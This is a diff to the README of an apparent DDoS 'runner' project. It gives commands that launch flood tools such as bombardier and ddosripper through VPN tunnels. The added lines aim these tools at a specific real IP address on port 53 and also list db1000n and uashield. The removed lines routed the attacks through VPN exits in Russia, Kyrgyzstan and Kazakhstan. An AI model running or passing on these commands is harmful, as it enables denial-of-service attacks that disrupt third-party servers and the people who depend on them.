@@ -9,31 +9,30 @@ cd / && sudo rm -rf runner && \
 sudo git clone https://github.com/ctukraine22/runner && \
 cd /runner && bash install.sh
 ```
+
+# Init
+```
+/runner/init.sh user1 code1 expressvpn Country
+/runner/init.sh %vpn-user% %vpn-pass% %vpn-type% "vpn-counties" %vpn-servers% %vpn-transport% %vpn-cret-repo%
+```
+
 # Run
 
-## Template
-
 ```
-cd /runner && . ./runner.sh && init 0 0 %vpn-user% %vpn-pass% %vpn-type% "vpn-counties" %vpn-servers% %vpn-transport% && %tool%
+/runner/run.sh bombardier 194.58.196.62 53 
+/runner/run.sh ddosripper 194.58.196.62 53 
+/runner/run.sh db1000n
+/runner/run.sh uashield
+
 ```
 - %vpn-type% here https://github.com/qdm12/gluetun/wiki
 - %vpn-transport%: tcp/udp
 - "vpn-counties" %vpn-servers%: different fore each vpn provider, see wiki
+- %vpn-cret-repo%: git repository which contains cert files in folder named same as %vpn-type%
 
 To use cyberhost you need fork this repo and replace key and crt: https://github.com/qdm12/gluetun/wiki/Cyberghost
-run uashield on cyberhost
-```
-cd /runner && . ./runner.sh && init 0 0 %user% %pass% cyberghost "Russian Federation" 97-1-ru.cg-dialup.net tcp && uashield
-```
-run uashield on expressvpn
-```
-cd /runner && . ./runner.sh && init 0 0 %user% %pass% expressvpn Kyrgyzstan kyrgyzstan-ca-version-2.expressnetw.com && uashield
-```
-run ddosripper for %ip% %port% on expressvpn
-cd /runner && . ./runner.sh && init %ip% %port% %user% %pass% expressvpn Kazakhstan && ddosripper
 
 # Supported tools
-- runAll: ddosripper/bombardier
 - db1000n
 - checksites
 - ddosripper
